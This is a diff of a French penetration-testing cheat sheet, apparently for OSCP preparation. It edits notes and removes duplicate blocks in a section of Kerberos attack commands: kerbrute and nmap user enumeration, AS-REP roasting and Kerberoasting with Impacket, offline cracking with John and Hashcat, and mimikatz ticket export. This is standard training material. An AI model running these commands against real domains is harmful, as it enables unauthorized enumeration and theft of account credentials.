@@ -1083,7 +1083,7 @@ printf 'put fichier_local fichier_distant\nquit\n' | tftp 192.0.2.10
 
 Examiner les objets, les droits et les services du domaine.
 
-<p class="oscp-command-note">Kerberos : identifier TCP 88 ; krb5-enum-users nécessite une liste de noms et le domaine cible.</p>
+<p class="oscp-command-note">Nmap : détecter Kerberos et tester une liste d'utilisateurs du domaine.</p>
 
 ```bash
 # Identifier le service Kerberos sur TCP 88 ; UDP 88 peut également être utilisé
@@ -1094,7 +1094,7 @@ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=EXEMPLE.
 
 ```
 
-<p class="oscp-command-note">Kerbrute : tester l'existence des noms d'utilisateurs du fichier contre le contrôleur de domaine autorisé.</p>
+<p class="oscp-command-note">Kerbrute : vérifier quels noms d'utilisateurs existent dans le domaine.</p>
 
 ```bash
 kerbrute userenum --dc <IP_DC> -d <DOMAINE> liste_utilisateurs.txt
@@ -1103,21 +1103,21 @@ kerbrute userenum --dc <IP_DC> -d <DOMAINE> liste_utilisateurs.txt
 
 ```
 
-<p class="oscp-command-note">AS-REP roasting : demander les réponses pour les comptes sans préauthentification du domaine autorisé.</p>
+<p class="oscp-command-note">GetNPUsers : récupérer les AS-REP des comptes sans préauthentification.</p>
 
 ```bash
 impacket-GetNPUsers -dc-ip <IP_DC> -request -usersfile liste_utilisateurs.txt <DOMAINE>/
 
 ```
 
-<p class="oscp-command-note">Impacket getTGT : demander un TGT avec un compte du domaine et un mot de passe autorisés.</p>
+<p class="oscp-command-note">getTGT : demander un ticket Kerberos avec un compte autorisé.</p>
 
 ```bash
 impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>
 
 ```
 
-<p class="oscp-command-note">Tester hors ligne des empreintes Kerberos avec John ; Hashcat -m 13100 concerne uniquement les TGS RC4-HMAC.</p>
+<p class="oscp-command-note">John : tester des empreintes Kerberos hors ligne. Hashcat `13100` : TGS RC4 uniquement.</p>
 
 ```bash
 john --wordlist=liste_mots_de_passe.txt tickets.hash
@@ -1126,27 +1126,19 @@ hashcat -m 13100 tickets_tgs.hash liste_mots_de_passe.txt
 
 ```
 
-<p class="oscp-command-note">Kerberos : distinguer TGT (getTGT) et ticket de service SPN (getST) avec des identifiants autorisés.</p>
+<p class="oscp-command-note">getST : demander un ticket de service pour un SPN existant.</p>
 
 ```bash
-# Demander un TGT Kerberos avec des identifiants autorisés
-impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>
-
 # Demander un ticket de service pour un SPN existant avec des identifiants autorisés
 impacket-getST -dc-ip <IP_DC> -spn <SERVICE>/<HOTE> <DOMAINE>/<UTILISATEUR>
 
 ```
 
-<p class="oscp-command-note">Impacket GetUserSPNs : demander des TGS pour les comptes de service accessibles ; cracking hors ligne ensuite.</p>
+<p class="oscp-command-note">GetUserSPNs : récupérer les empreintes TGS des comptes de service accessibles.</p>
 
 ```bash
 # Demander les TGS des SPN accessibles et enregistrer leurs empreintes pour une analyse hors ligne
-impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
-
-# Tester hors ligne les empreintes de tickets avec John ou Hashcat selon leur type
-john --wordlist=<wordlist> <tickets_file>
-# Ou
-hashcat -m 13100 <tickets_file> <wordlist>
+impacket-GetUserSPNs -dc-ip <IP_DC> -request -outputfile tickets_tgs.hash '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>'
 
 ```
 
@@ -1156,12 +1148,9 @@ krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 
 ```
 
-<p class="oscp-command-note">Impacket : demander un TGT avec un compte autorisé ; les exemples Rubeus ci-dessous étaient incorrects.</p>
+<p class="oscp-command-note">Rubeus : vérifier les options dans l'aide ; `/rc4` attend une empreinte, pas un mot de passe.</p>
 
 ```bash
-# Obtenir un TGT avec un compte autorisé (ceci n'est pas un renouvellement)
-impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur
-
 # Vérifier la syntaxe exacte de Rubeus dans son aide avant tout test.
 # /rc4 attend une empreinte RC4, pas un mot de passe en clair.
 
@@ -1175,14 +1164,6 @@ mimikatz "sekurlsa::tickets /export"
 
 ```
 
-<p class="oscp-command-note">Kerbrute : tester une liste de noms sur le contrôleur de domaine spécifié, sans mot de passe.</p>
-
-```bash
-# Énumérer les utilisateurs Kerberos autorisés avec le binaire Kerbrute
-kerbrute userenum --dc 192.0.2.10 -d exemple.local utilisateurs.txt
-
-```
-
 <p class="oscp-command-note">Windows : consulter les tickets Kerberos du compte courant sans en créer ni en importer.</p>
 
 ```powershell
@@ -1190,14 +1171,7 @@ klist
 
 ```
 
-<p class="oscp-command-note">Linux : demander un TGT Kerberos avec Impacket et un compte de laboratoire.</p>
-
-```bash
-impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur
-
-```
-
-<p class="oscp-command-note">Windows : afficher les tickets Kerberos actuellement présents dans le cache avec klist tickets.</p>
+<p class="oscp-command-note">Windows : afficher les tickets Kerberos en cache.</p>
 
 ```powershell
 klist tickets
